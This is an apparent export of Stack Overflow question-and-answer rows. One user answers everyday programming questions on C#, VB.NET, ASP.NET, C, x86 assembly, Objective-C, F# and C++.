"<p>I realize the code sample below is something you should never do. My question is just one of interest. If you allocate a block of memory, and then move the pointer (a no-no), when you deallocate the memory, what is the size of the block that is deallocated, and where is it in memory? Here's the contrived code snippet: </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
    char* s = malloc(1024);
    strcpy(s, ""Some string"");
    // Advance the pointer...
    s += 5;
    // Prints ""string""
    printf(""%s\n"", s);
    /*
     * What exactly are the beginning and end points of the memory 
     * block now being deallocated?
     */
    free(s);
    return 0;
}
</code></pre>

<p>Here is what I think I happens. The memory block being deallocated begins with the byte that holds the letter ""s"" in ""string"". The 5 bytes that held ""Some "" are now lost. </p>

<p>What I'm wondering is: Are the 5 bytes whose location in memory immediately follows the end of the original 1024 bytes deallocated as well, or are they just left alone?</p>

<p>Anyone know for sure what is it the compiler does? Is it undefined? </p>

<p>Thanks.</p>
","33708","","<p>Yes, it is undefined behavior. You're essentially freeing a pointer you didn't <code>malloc</code>.</p>
"
"<p>Array.Sort(test);</p>

<p>Comes out to be</p>

<pre><code>_A
_B
_C
A
B
C
</code></pre>

<p>I reverse it</p>

<pre><code>C
B
A
_C
.. You know
</code></pre>

<p>I want it to be</p>

<pre><code>_C
_B
_A
C
B
A
</code></pre>

<p>So how could I do that?</p>
","33708","","<p>Probably not the fastest way...</p>

<pre><code>test = test.Where(x =&gt; x.StartsWith(""_"")).OrderByDescending(x =&gt; x).Concat(
       test.Where(x =&gt; !x.StartsWith(""_"")).OrderByDescending(x =&gt; x)).ToArray();
</code></pre>
"
"<p>In the assembly opcode cmovl, what gets compared?
For example:
    EAX: 00000002
    EBX: 00000001</p>

<pre><code>cmovl eax,ebx
</code></pre>

<p>What is the result? Which one needs to be less so they can be moved?</p>

<p>Thank you!</p>
","33708","","<p>It should be preceded by another instruction that sets flags appropriately, like <code>cmp</code>. </p>

<pre><code>cmp ebx, ecx   ; compare ebx to ecx and set flags.
cmovl ebx, eax ; if (ebx &lt; ecx (comparison based on flags)) ebx = eax
</code></pre>
"
"<p>Given in the following <a href=""http://msdn.microsoft.com/en-us/library/aa711965%28VS.71%29.aspx"" rel=""nofollow"">language specification</a>, for me at least, calling Db.Foobar() [In the following code]  does not indeed call off to the Shared Constructors of the base classes.  I am curious as to a) is this my own fault for doing something wrong or b) is this an error in the language specification</p>

<pre><code>Public MustInherit Class D1
    Shared Sub New()
        Console.WriteLine(""D1 Static Constructor Called"")
    End Sub
End Class

Public MustInherit Class D2
    Inherits D1

End Class

Public Class Da
    Inherits D2

    Public Sub New()
        Console.WriteLine(""Public Da Constructor Called"")
    End Sub
End Class

Public Class Db
    Inherits D2

    Shared Sub New()
        Console.WriteLine(""Db Static Constructor Called"")
    End Sub

    Public Sub New()
        Console.WriteLine(""Public Db Constructor Called"")
    End Sub

    Public Shared Sub FooBar()
        Console.WriteLine(""FooBar Called"")
    End Sub
End Class
</code></pre>
","33708","","<p>VB.NET does call shared constructor of the base class before <strong>instantiating</strong> the class or its derived classes or upon accesses to <code>Shared</code> members of the <strong>class itself</strong>. </p>

<p>From a theoretical point of view, <code>Shared</code> (<code>static</code>) stuff are non-object oriented stuff in an object oriented language (e.g. they don't support polymorphism.) There's no need to call the base class <code>Shared</code> constructor when you access static members of a derived class. Each class is a completely separate entity when it comes to static members. </p>

<p><strong>UPDATE (re comment):</strong></p>

<p>It think you are referring to the following code snippet:</p>

<blockquote>
  <p>By contrast, the following example produces predictable output, because the Shared constructor for the class A must execute before the Shared constructor for the class B, which derives from it:</p>
</blockquote>

<pre><code>Imports System

Module Test
    Sub Main()
        Console.WriteLine(""1"")
        B.G()
        Console.WriteLine(""2"")
    End Sub
End Module

Class A
    Shared Sub New()
        Console.WriteLine(""Init A"")
    End Sub
End Class

Class B
    Inherits A

    Shared Sub New()
        Console.WriteLine(""Init B"")
    End Sub

    Public Shared Sub G()
        Console.WriteLine(""B.G"")
    End Sub
End Class
</code></pre>

<p>That link says the output should be (which is not):</p>

<pre><code>Init A
Init B
B.G
</code></pre>

<p>this is <em>clearly</em> wrong (regardless of being old.) Even if you don't consider the implications of the <code>Shared</code> constructor, the output doesn't have ""1"" and ""2"" printed directly by <code>Main</code>.</p>

<p>Beside that, I think that page contradicts itself. The rules mentioned near the beginning of the page are correct (except the item ""Shared constructors are run before any types that derive from the type are loaded."" in which ""loaded"" is a bit vague. Instantiated is a more correct word here.) None of the rules say if derived class <code>Shared</code> constructor is called, base class <code>Shared</code> constructor is guaranteed to be called too.</p>
"
"<p>If i have an object of type Photo and a Result set which is sorted in a particular order, is there a way for me to get the position of the current Photo object in the result set. and then get all objects that would follow it?</p>
","33708","","<p>Not sure if I understand correctly but this might help:</p>

<pre><code>var result = photos.Skip(100); // 100 would be the position of current object.

// if you don't know the index of the current object:
// This won't work on LINQ to SQL directly, do it on a list or something.
var result = photos.SkipWhile(x =&gt; x != currentObject).Skip(1);
</code></pre>

<p>In reality, if you are dealing with a database, there should be some identifier (a set of columns) you are sorting by. If you want to do the whole thing on the server side, you can grab the properties of the current object and filter the result set specifically for objects that would come after that in the sort order you want.</p>
"
"<p>I would like to assertain the class name of an aspx page from within a user control.  How can I go about doing this?</p>
","33708","","<p>I can't think of a use case but try:</p>

<pre><code>string name = Page.GetType().Name;
</code></pre>
"
"<p>Consider the following code:</p>

<pre><code>if (IsDebuggingEnabled) { 
   instance.Log(GetDetailedDebugInfo()); 
}
</code></pre>

<p><code>GetDetailedDebugInfo()</code> may be an expensive method, so we only want to call it if we're running in debug mode.</p>

<p>Now, the cleaner alternative is to code something like this:</p>

<pre><code>instance.Log(() =&gt; GetDetailedDebugInfo());
</code></pre>

<p>Where .Log() is defined such as:</p>

<pre><code>public void Log(Func&lt;string&gt; getMessage)
{
    if (IsDebuggingEnabled) 
    {
        LogInternal(getMessage.Invoke());
    }
}
</code></pre>

<p>My concern is with performance, preliminary testing doesn't show the second case to be particularly more expensive, but I don't want to run into any surprises if load increases.</p>

<p>Oh, and please don't suggest conditional compilation because it doesn't apply to this case.</p>

<p>(P.S.: I wrote the code directly in the StackOverflow Ask a Question textarea so don't blame me if there are subtle bugs and it doesn't compile, you get the point :)</p>
","33708","","<p>No, it shouldn't have a bad performance. After all, you'll be calling it only in debug mode where performance is not at the forefront. Actually, you could <strong>remove the lambda and just pass the method name</strong> to remove the overhead of an unnecessary intermediate anonymous method.</p>

<p>Note that if you want to do this in Debug builds, you can add a <a href=""http://msdn.microsoft.com/en-us/library/system.diagnostics.conditionalattribute.aspx"" rel=""nofollow""><code>[Conditional(""DEBUG"")]</code></a> attribute to the log method.</p>
"
"<p>If a .pdb (program debug) file is included with a .dll then line numbers appear in the stack trace of any exception thrown. Does this affect the performance of the application?</p>

<p><hr /></p>

<p>This question is not about release vs. debug, i.e. optimisations. It is about the performance implications of having .pdb files. Are the .pdb files read every time an exception is thrown? Is the information cached in some way when the assemblies are loaded? Or is it cached the first time a relevant exception is thrown? How much difference does it make?</p>
","33708","","<p>Not normally. PDBs and optimizations are orthogonal. One can be enabled regardless of the value of the other option. However, it might reduce performance if you want to actually use the information contained in PDB, like when you are accessing the <code>StackTrace</code> of an exception and it needs to get line numbers from PDB or when you call <code>new StackTrace(true)</code>. </p>

<p>By the way, Eric Lippert has a <a href=""http://blogs.msdn.com/ericlippert/archive/2009/06/11/what-does-the-optimize-switch-do.aspx"" rel=""nofollow"">related blog entry about compiler optimizations</a>.</p>
"
"<p>I'm sure this is a pretty straight forward question. I'm writing a small windows forms app using C++/CLI. When the form initializes, I start a thread that will process some code. When the code in the thread is executed, I want the thread to somehow update the text in a statusbar in the bottom of the window. So I was thinking something like this:</p>

<ol>
<li>I create an event. </li>
<li>Then I create the Thread that will do some processing. </li>
<li>When the processing is done, fire an event that makes the text in the statusbar update.</li>
</ol>

<p>Is this a reasonable way to go? If so, how do I update the statusbar from within the thread? Maybe there is a smarter way to acheive this?</p>

<p>Would be very thankful for some advice on this.</p>
","33708","","<p>Declare a method like that changes the status text given a string:</p>

<pre><code>private: void UpdateStatus(String^ msg) {
    statusBar.Text = msg;
}
</code></pre>

<p>and from the other thread, use <a href=""http://msdn.microsoft.com/en-us/library/a1hetckb%28VS.80%29.aspx"" rel=""nofollow""><code>Invoke</code></a>:</p>

<pre><code>Invoke(gcnew Action&lt;String^&gt;(this, &amp;Form1::UpdateStatus), ""message"");
</code></pre>

<p><code>Invoke</code> will call the given delegate with the specified parameters on the UI thread.</p>
"
"<p>I'm very new to C# so please bear with me...</p>

<p>I'm implementing a partial class, and would like to add two properties like so:</p>

<pre><code>public partial class SomeModel
{
    public bool IsSomething { get; set; }
    public List&lt;string&gt; SomeList { get; set; }

    ... Additional methods using the above data members ...
}
</code></pre>

<p>I would like to initialize both data members: <code>IsSomething</code> to <code>True</code> and <code>SomeList</code> to <code>new List&lt;string&gt;()</code>. Normally I would do it in a constructor, however because it's a partial class I don't want to touch the constructor (should I?).</p>

<p>What's the best way to achieve this?</p>

<p>Thanks</p>

<p>PS I'm working in ASP.NET MVC, adding functionality to a a certain model, hence the partial class. </p>
","33708","","<p>You can't have two constructors in two parts of a partial class. However, you can use <a href=""http://msdn.microsoft.com/en-us/library/6b0scde8.aspx"" rel=""nofollow"">partial methods</a> to accomplish something like it:</p>

<pre><code>// file1:
partial void Initialize();
public Constructor() {
    // ... stuff ... initialize part 1
    Initialize();
}

// file2:
void Initalize() {
    // ... further initializations part 2 might want to do
}
</code></pre>

<p>If no parts of a partial class defines the partial method, all calls to it would be omitted.</p>
"
"<p>In C#, how does one obtain a generic enumerator from a given array?</p>

<p>In the code below, <code>MyArray</code> is an array of <code>MyType</code> objects.  I'd like to obtain <code>MyIEnumerator</code> in the fashion shown,
but it seems that I obtain an empty enumerator (although I've confirmed that <code>MyArray.Length > 0</code>).</p>

<pre><code>MyType [ ]  MyArray  =  ... ;
IEnumerator&lt;MyType&gt;  MyIEnumerator
  =  ( MyArray.GetEnumerator() as IEnumerator&lt;MyType&gt; ) ;
</code></pre>
","33708","","<p>Works on 2.0+:</p>

<pre><code>((IEnumerable&lt;MyType&gt;)myArray).GetEnumerator()
</code></pre>

<p>Works on 3.5+ (fancy LINQy, a bit less efficient):</p>

<pre><code>myArray.Cast&lt;MyType&gt;().GetEnumerator()   // returns IEnumerator&lt;MyType&gt;
</code></pre>
"
"<p>An <a href=""http://stackoverflow.com/questions/1272602/c-how-to-set-default-value-for-a-property-in-a-partial-class/1272647#1272647"">answer</a> in this <a href=""http://stackoverflow.com/questions/1272602/c-how-to-set-default-value-for-a-property-in-a-partial-class"">question</a> made me wonder about the .NET framework design choices.</p>

<p>The .NET framework has full support for <a href=""http://msdn.microsoft.com/en-us/library/wa80x488.aspx"">Partial classes, interfaces, and methods</a>.  Is there a compelling reason that support for partial constructors was not added, in the same manner?</p>

<p>This seems like it would simplify class construction within partial classes.  For example, form constructors built by a designer in Windows Forms could have the form construction code directly in the constructor, split into two files.  Partial ""Initialize()"" methods seem to be a somewhat common pattern, which could be simplified in this case.</p>

<p>The only potential downside I can see would be the lack of determinism in the order of constructor calls, but in many cases, the ordering of the parts wouldn't matter.  If it did, you could always avoid the partial constructor.</p>
","33708","","<p>Well, <code>partial</code> classes and interfaces are another story. This concept would be comparable to <code>partial</code> methods. They actually does nothing but to tell the compiler this method can exist somewhere and if it doesn't remove the method call. It doesn't allow introduction of a duplicate method. </p>

<p>Since a constructor is never called directly, it wouldn't make any sense to have such a concept. I believe the current initialize pattern works pretty well in most scenarios. Introducing another partial thing would unnecessarily make the language more complex without introducing significant benefits.</p>
"
"<p>I am creating an application that uses a 3rd party payment gateway.
I submit my transaction details, and the documentation says that:</p>

<p>The following fields will be supplied to the return script using the POST method:</p>

<p>So, the 3rd party payment gateway POSTs to a url i specify...
how can i get the values of the POST request on this page?</p>
","33708","","<p>If it sends key value pairs like in the query string format, you can use <code>Request.Form</code> to read it. Otherwise to get raw POST content try:</p>

<pre><code>Request.BinaryRead
</code></pre>
"
"<p>I have to send many web service calls out to delete a bunch of records in Amazon SDB (unfortunately, rows can only be deleted one at at time currently).</p>

<p>I am using Amazon's SDB c# library which does not use async WebRequests.</p>

<p>Currently I use ThreadPool.QueueUserWorkItem to queue up a bunch of calls (I configured my connectionManagement maxconnection to allow for a bunch of connections)
this works well..as the request is sent out, it blocks and another request is made.</p>

<p>Is this the wrong way to achieve this goal?  Should I be using async delegates and doing BeginInvoke and EndInvoke?</p>
","33708","","<p>If you just need to queue up some jobs (that don't return values directly) go with <code>ThreadPool.QueueUserWorkItem</code>. It's faster. The difference is covered in <a href=""http://stackoverflow.com/questions/532791/whats-the-difference-between-queueuserworkitem-and-begininvoke-for-performi"">other questions</a> (and some great blog entries out there.)</p>
"
"<p>I want to check if a generic variable is of a certain type but don't want to check the generic part.</p>

<p>Let's say I have a variable of <code>List&lt;int&gt;</code> and another of <code>List&lt;double&gt;</code>. I just want to check if it is of type <code>List&lt;&gt;</code></p>

<pre><code>if(variable is List) {}
</code></pre>

<p>And not</p>

<pre><code>if (variable is List&lt;int&gt; || variable is List&lt;double&gt;) {}
</code></pre>

<p>is this  possible?</p>

<p>Thanks</p>
","33708","","<pre><code>variable.GetType().IsGenericType &amp;&amp; 
            variable.GetType().GetGenericTypeDefinition() == typeof(List&lt;&gt;)
</code></pre>

<p>Of course, this only works if variable is of type <code>List&lt;T&gt;</code>, and isn't a derived class. If you want to check if it's <code>List&lt;T&gt;</code> or inherited from it, you should traverse the inheritance hierarchy and check the above statement for each base class:</p>

<pre><code>static bool IsList(object obj)
{
    Type t = obj.GetType();
    do {
        if (t.IsGenericType &amp;&amp; t.GetGenericTypeDefinition() == typeof(List&lt;&gt;))
            return true;
        t = t.BaseType;
    } while (t != null);
    return false;
}
</code></pre>
"
"<p>I'm trying to read a file that I have a web address for into a byte array.  I've been using <code>File.ReadAllBytes</code> to read files locally and I've been unable to figure out the cleanest way to do this for a file on the web.  </p>

<p>I imagine this is just a quick snippet of code, but everything I can find through search is only for local files.  </p>

<p>Thanks!</p>
","33708","","<pre><code>byte[] response = new System.Net.WebClient().DownloadData(url);
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br />
  <a href=""http://stackoverflow.com/questions/858080/nullable-types-and-the-ternary-operator-why-wont-this-work"">Nullable types and the ternary operator. Why won&rsquo;t this work?</a>  </p>
</blockquote>

<p>Why doesn't this work? Seems like valid code. Can anyone help?</p>

<pre><code>  string cert = ddCovCert.SelectedValue;
  int? x = (string.IsNullOrEmpty(cert)) ? null: int.Parse(cert);
  Display(x);
</code></pre>

<p>How should I code this? The method takes a Nullable. If the drop down has a string selected I need to parse that into an int otherwise I want to pass null to the method.</p>

<p>Thanks,
~ck in San Diego</p>
","33708","","<pre><code>int? x = string.IsNullOrEmpty(cert) ? (int?)null : int.Parse(cert);
</code></pre>
"
"<p>Is there any difference between performing binding on .aspx page via &lt;%# some code %> and &lt;%= some code %>?</p>

<p>Example:</p>

<blockquote>
  <p>&lt;%# ResolveUrl(""~/default.aspx"") %></p>
</blockquote>

<p>VS </p>

<blockquote>
  <p>&lt;%= ResolveUrl(""~/default.aspx"") %></p>
</blockquote>

<p>Thanks.
-Igor</p>
","33708","","<p><code>&lt;%# %&gt;</code> is used in <em>binding expressions</em>. Simply, when a <code>Control.DataBind</code> is called, the binding expressions will take their actual values. It can be used to set some properties on server controls based on the run time value of an expression.</p>

<p><code>&lt;%= expression %&gt;</code> is equivalent to <code>&lt;% Response.Write(expression); %&gt;</code> which runs on <em>render</em> phase and directly outputs the value of the expression. As a result, it can't be used to modify behavior of server-side objects.</p>
"
"<p>Both tools translate assembly instructions directly into machine code, but is it possible to determine which one produces the fastest and cleanest code?</p>
","33708","","<p>When you're writing in assembler, <strong>you are precisely describing the instructions to generate</strong> so it doesn't depend on the assembler. It depends on you. There's a one-to-one correspondence between the mnemonics you write and actual instructions in machine code.</p>
"
"<ol>
<li>Create a new ASP.NET MVC Web
Application </li>
<li>Create an ASP.NET App_Code
 Folder</li>
<li><p>Inside the new
folder, create a class with an
Extension Method. For example:</p>

<pre><code>static public class BugMVCExtension
{
    public static int ToInt(this string str)
    {
        return Convert.ToInt32(str);
    }
}
</code></pre></li>
<li><p>Choose a View and try to use this new Extension Method</p></li>
</ol>

<p>You will get this Exception:</p>

<pre><code>CS0121: The call is ambiguous between the following methods or properties:
'*MvcApplication1.App_code.BugMVCExtentions.ToInt(string)*' and
'*MvcApplication1.App_code.BugMVCExtentions.ToInt(string)*'
</code></pre>

<p>Anyone here has more information about it? 
Is it wrong to create an App_code in an ASP.NET MVC(?) Web Applications?</p>
","33708","","<p>MVC projects created in Visual Studio use Web application project model by default. <code>App_Code</code> is mostly used by Web site model. I suggest reading about differences between them (<a href=""http://stackoverflow.com/questions/398037/asp-net-web-site-or-web-application"">another question covers this</a> and it's also covered extensively on MSDN). If you add a source file to <code>App_Code</code> in a Web application project, Visual Studio will compile it to a DLL (since it's included in the project) and puts it in <code>/bin</code>. At run time, the ASP.NET compiler sees <code>App_Code</code> and tries to compile the source in a different assembly. As a consequence, two separate classes with identical names will exist in two different assemblies and when the ASP.NET parser tries to compile the <code>.aspx</code> file, it'll fail to choose one.</p>

<h3>Update:</h3>

<p>Are those two (extension method and the class you're instantiating) in a single .cs file? Otherwise, probably, the class you're instantiating is in a source file with <strong>Build Action</strong> (right click on file, click properties) set to <strong>Content</strong> which tells Visual Studio to skip it in the build process (in that case, you won't be able to reference it in other .cs files that are outside <code>App_Code</code> but you'll be able to use it in the view since it'll only come to life at run time.) If the build action is <strong>Compile</strong>, you'll get an error. The issue is definitely not specific to extension methods. Visual Studio seems to be smart enough to set it to Content by default for source files added to <code>App_Code</code>.</p>
"
"<p>I can add an item and its value to a combobox with following code.</p>

<pre><code>combobox1.Items.add(new Item(""text"",""value""));
</code></pre>

<p>how do I add a value to a text in string collection editor? I can only add text in string collection editor.</p>
","33708","","<p>I'm afraid you can only specify the text using the Visual Studio built-in editor.</p>
"
"<p>I have developed a website in asp.net for iPhone.
Now I am stuck in how to deploy that site on the iphone?<br />
Never done it before.
How to make it iphone ready so the device can access the site ?
Any ideas...</p>

<p>Thank you All.</p>
","33708","","<p>Copy the stuff to the Web server, setup the databases if necessary, just as you'd do for a Web app designed for desktop browsers. Is this a real question?</p>
"
"<p>Can I pass a method with an out parameter as a Func?</p>

<pre><code>public IList&lt;Foo&gt; FindForBar(string bar, out int count) { }

// somewhere else
public IList&lt;T&gt; Find(Func&lt;string, int, List&lt;T&gt;&gt; listFunction) { }
</code></pre>

<p>Func needs a type so out won't compile there, and calling listFunction requires an int and won't allow an out in.</p>

<p>Is there a way to do this?</p>
","33708","","<p><code>ref</code> and <code>out</code> are not part of the type parameter definition so you can't use the built-in <code>Func</code> delegate to pass <code>ref</code> and <code>out</code> arguments. Of course, you can declare your own delegate if you want:</p>

<pre><code>delegate V MyDelegate&lt;T,U,V&gt;(T input, out U output);
</code></pre>
"
"<p>A friend asked me how to improve some code with LINQ. How would you do a character by character comparison between two strings to count the number of matches at an index? Here's the original code, could it be improved with LINQ?</p>

<pre><code>private int Fitness(string individual, string target)
   {
       int sum = 0;
       for (int i = 0; i &lt; individual.Length; i++)
           if (individual[i] == target[i]) sum++;
       return sum;
   }
</code></pre>
","33708","","<pre><code>return Enumerable.Range(0, individual.Length)
                 .Count(i =&gt; individual[i] == target[i]);
</code></pre>

<p>A more fool-proof way would be (the above snippet will fail if <code>target</code> is shorter than <code>individual</code>):</p>

<pre><code>return Enumerable.Range(0, Math.Min(individual.Length, target.Length))
                 .Count(i =&gt; individual[i] == target[i]);
</code></pre>

<p><hr /></p>

<p>I believe the code is correct as is. <a href=""http://msdn.microsoft.com/en-us/library/system.linq.enumerable.range.aspx"" rel=""nofollow""><code>Enumerable.Range</code></a> method takes two arguments. The first of which is the start index (should be <code>0</code>), the second is the count of items. The complete code snippet to test and make sure:</p>

<pre><code>class Program {
  static void Main(string[] args) {
      Console.WriteLine(Fitness(""hello"", ""world""));
  }
  static int Fitness(string individual, string target) {
      return Enumerable.Range(0, Math.Min(individual.Length, target.Length))
                       .Count(i =&gt; individual[i] == target[i]);
  }
}
</code></pre>
"
"<p>I have an ASP.NET MVC application, with a view that submits form values via POST. When my controller action method receives the POSTed data it only does server side things with it, no need for feedback to the client side.</p>

<p>However I am required to return an ActionResult. If I return null or EmptyResult, the page becomes blank after the form is submitted. I could return the View, but it is pretty 'expensive' to build, so I wonder if there is a way to simply have the values POSTed and then NOT have the browser expect anything in return?</p>
","33708","","<p>You should consider posting the form using AJAX techniques like <code>jquery.post</code>.</p>
"
"<p>I wish to write a structure made up of fixed length strings to a file using My.Computer.FileSystem.WriteAllBytes or the like.</p>

<p>I am using a VB6 project with fixed length strings that I have converted in to VB.Net.</p>

<pre><code>    Structure Record
    	&lt;VBFixedString(22),System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray,SizeConst:=22)&gt; Public tim() As Char
    	&lt;VBFixedString(130),System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray,SizeConst:=130)&gt; Public des() As Char
    	&lt;VBFixedString(2),System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray,SizeConst:=2)&gt; Public crlf() As Char
    End Structure
</code></pre>

<p>Still new to marshalling in C#, but how would I get this structure to an array of bytes to write to a file.  Is there some marshalling trick or am I going to have to write a custom method?</p>
","33708","","<p>Use serialization mechanisms provided by the .NET framework:</p>

<pre><code>Dim formatter As New BinaryFormatter
formatter.Serialize(outputFileStream, objectInstance)
</code></pre>

<p>You should add <code>&lt;Serializable()&gt;</code> attribute to your type.</p>
"
"<p>I have asp.net 3.5 sp1 installed, using vs.net 2008.</p>

<p>Is asp.net mvc still a separate downlaod?</p>
","33708","","<p>Yes, it is a separate package. It's final version was released a long time after Visual Studio 2008 SP1.</p>
"
"<p>What happens if we serialize a static class? Can more than one instance of the static class be created if we serialize it?</p>

<pre><code>[Serializable]
public static class MyClass
{
    public static MyClass()
    {

    }

    public static bool IsTrue()
    {
       return true;
    }
}
</code></pre>

<p>Suppose I XmlSerialize the object to a XML file, and at a later time I de-serialize back to a object. Another copy exists in the memory (created when somone instintiated the static calss for the first time). Will, there be two copy of the of the object? If yes, can we stop that? Does it apply to any class which follows the singleton pattern?</p>
","33708","","<p>You can't serialize <code>static</code> classes (or any class whatsoever) using built-in .NET serialization features. You can only serialize <em>instances</em> of classes.</p>
"
"<p>I'm very new to F# so please excuse the completely newbie question:</p>

<p>I have a sequence stored in a variable called prices. I'd like to output the contents of this sequence to the interactive window. What's the easiest command to do this?</p>

<p>Here is my sequence:</p>

<pre><code>&gt; prices;;
val it : seq&lt;System.DateTime * float&gt; = seq []
</code></pre>

<p>I've tried printf'ing it but that gives me the error:</p>

<pre><code>&gt; printf(""%A"", prices);;

  printf(""%A"", prices);;
  -------^^^^^^^^^^^^

stdin(82,8): error FS0001: The type ''b * 'c' is not compatible with the type 'Printf.TextWriterFormat&lt;'a&gt;'
</code></pre>

<p>Any help would be appreciated.</p>
","33708","","<pre><code>&gt; prices;;
val it : seq&lt;System.DateTime * float&gt; = seq []
</code></pre>

<p>It's doing its job: <code>seq []</code> means the sequence is empty.</p>
"
"<p>I have a LINQ query which returns all the values inside a Dictionary, conditional upon something:</p>

<pre><code>var apps =
from entry in shape.Decorators
where entry.Value == DecoratorLayoutStyle.App
select entry.Key;
</code></pre>

<p>shape.Decorators is a </p>

<pre><code>Dictionary&lt;Shape, DecoratorLayoutStyle&gt;
</code></pre>

<p>Is there something terser, and/or can I use a combination of lambdas or something?</p>
","33708","","<pre><code>var apps = Shape.Decorators.Where(x =&gt; x.Value == DecoratorLayoutStyle.App)
                           .Select(x =&gt; x.Key);
</code></pre>
"
"<p>How can I get an array of pointers pointing to objects (classes) ?</p>

<p>I need to dynamically allocate space for them and the length of array isn't determined until run-time. Can any one explain and tell me how to define it? and possibly explain them how it works, would be really nice :)</p>
","33708","","<p>Use <code>std::vector</code> instead. It's designed to dynamically resize the collection as needed.</p>

<pre><code>#include &lt;vector&gt;
// ...
std::vector&lt;Class*&gt; vec;
vec.push_back(my_class_ptr);
Class* ptr = vec[0];
</code></pre>
"
"<p>This morning I ran into a crash in an iPhone app I am working on and while I fixed the bug, I'm curious about syntactic reason it was a problem.</p>

<p>Here is my code reduced to simple elements.  I am populating items in a TableView using an NSArray for the items.  The NSArray is a property:</p>

<pre><code>@interface FooViewController : UITableViewController {
    NSArray *stuff;
}

@property (nonatomic, retain) NSArray *stuff;
</code></pre>

<p>And in my implementation file:</p>

<pre><code>@synthesize stuff;

- (void)viewDidLoad {     
    NSArray *arr = [[NSArray alloc] initWithObjects:@"""", @""Item 1"", @""Item 2"",   
                                       @""Lorem"", @""Ipsum"", nil];
    self.stuff = arr;

    [arr release];
}
</code></pre>

<p>Now, when I first wrote the method, I accidentally left off the ""self."" and that caused the bomb.  Although while testing, it worked at first blush.  I'd tried:</p>

<pre><code>stuff = arr;
NSLog(@""%d"", [stuff count]);
</code></pre>

<p>But using <b>stuff</b> in other methods bombed.  Now that I've fixed the problem, I can use [stuff count] in other places.  </p>

<p>So why can I use <b>stuff</b> in some places but in others I must use <b>self.stuff</b>?</p>
","33708","","<p><code>stuff = ...</code> directly references the backing field of the property. It doesn't increase the retain count. As a result, releasing the object somewhere else might take its retain count down to zero and have it deallocated while you're still holding a reference to it. Also, it may cause a memory leak for the previous value of the property.<br />
The reason it looks like working sometimes is that the object is probably not deallocated yet, by someone else.</p>

<p>On the other hand, <code>self.stuff = ...</code> will send a message to the property's set accessor which will take care of retain count.</p>
"
"<p>I need to know if the application object in ASP 3.0 is shared between all the web site in the same application pool in IIS or it's one application object by site in the same application pool in IIS.</p>

<p>Thanks</p>
","33708","","<p>No, it's not shared in an application pool. It's shared in a single application (virtual directory.)</p>

<p><hr /></p>

<p>Clarification per Anthony's comment: <code>Application</code> object is shared in a single application. A top level Web site or a virtual directory is considered a separate application on its own. If you have two domain names (host headers) mapped to a single Web site in IIS, it's considered the same application. It doesn't matter how the Web site is referenced by the clients. What matters is whether or not IIS has individual entries for the Web sites.</p>
"
"<p>Simple question - do i need to free or release structs.  My reason for asking is that I'm use a  NSInvocation and the SEL type is a struct.  Just want to know if I need to release it.  Thanks.</p>
","33708","","<p>In Objective-C and C in general, if something is not a pointer to somewhere else in memory and the whole thing is allocated on stack, you won't need to free it. It'll get freed as soon as the stack pointer is adjusted at the end of function.</p>
"
"<p>I want to use the Caching.Cache(...) method, like so:</p>

<pre><code>Cache.Insert(""Interview Questions"", datatable, sqlcachedep)
</code></pre>

<p>or</p>

<pre><code>System.Web.Caching.Cache.Insert(""Reading List"", datatable, sqlcachedep);
</code></pre>

<p>There is no problem with the variables, but I get this error message in either case:</p>

<blockquote>
  <p>Error 1 - An object reference is required for the non-static field, method, or property 'System.Web.Caching.Cache.Insert(string, object, System.Web.Caching.CacheDependency)' </p>
</blockquote>

<p>How can I fix this?</p>

<p>Thanks</p>
","33708","","<p>It's saying the correct thing. You should try something like:</p>

<pre><code>HttpContext.Current.Cache.Insert(...);
</code></pre>

<p><a href=""http://msdn.microsoft.com/en-us/library/system.web.caching.cache.insert.aspx""><code>Cache.Insert</code></a> is a not a static method (static methods are indicated by an ""S"" near the method icon in the documentation.) You need an instance to call the <code>Insert</code> method on. <code>HttpContext.Current.Cache</code> returns the <code>Cache</code> object associated with the current application.</p>
"
"<p>In .Net, is there any functional difference between creating a new SqlCommand object and attaching a SqlConnection to it and calling CreateCommand on an existing SqlConnection object?</p>
","33708","","<p>They do the same thing. The rationale behind <code>SqlConnection.CreateCommand</code> is to implement the factory pattern.</p>
"
"<p>This is more of an academic question about performance than a realistic 'what should I use' but I'm curious as I don't dabble much in IL at all to see what's constructed and I don't have a large dataset on hand to profile against.</p>

<p>So which is faster:</p>

<pre><code>List&lt;myObject&gt; objs = SomeHowGetList();
List&lt;string&gt; strings = new List&lt;string&gt;();
foreach (MyObject o in objs)
{
    if (o.Field == ""something"")
        strings.Add(o.Field);
}
</code></pre>

<p>or:</p>

<pre><code>List&lt;myObject&gt; objs = SomeHowGetList();
List&lt;string&gt; strings = new List&lt;string&gt;();
string s;
foreach (MyObject o in objs)
{
    s = o.Field;
    if (s == ""something"")
        strings.Add(s);
}
</code></pre>

<p>Keep in mind that I don't really want to know the performance impact of the string.Add(s) (as whatever operation needs to be done can't really be changed), just the performance difference between setting s each iteration (let's say that s can be any primitive type or string) verses calling the getter on the object each iteration.</p>
","33708","","<p>Most of the time, your second code snippet should be <em>at least as fast as</em> the first snippet.</p>

<p>These two code snippets are not functionally equivalent. Properties are not guaranteed to return the same result across individual accesses. As a consequence, the JIT optimizer is not able to cache the result (except for trivial cases) and it will be faster if you cache the result of a long running property. Look at this example: <a href=""http://stackoverflow.com/questions/1136825/why-foreach-is-faster-than-for-loop-while-reading-richtextbox-lines"">why foreach is faster than for loop while reading richtextbox lines</a>.</p>

<p>However, for some specific cases like:</p>

<pre><code>for (int i = 0; i &lt; myArray.Length; ++i)
</code></pre>

<p>where <code>myArray</code> is an array object, the compiler is able to detect the pattern and optimize the code and omit the bound checks. It might be slower if you cache the result of <code>Length</code> property like:</p>

<pre><code>int len = myArray.Length;
for (int i = 0; i &lt; myArray.Length; ++i)
</code></pre>
"
"<p>I have been told that a handle is sort of a pointer, but not, and that it allows you to keep a reference to an object, rather than the object itself. What is a more elaborate explanation?</p>
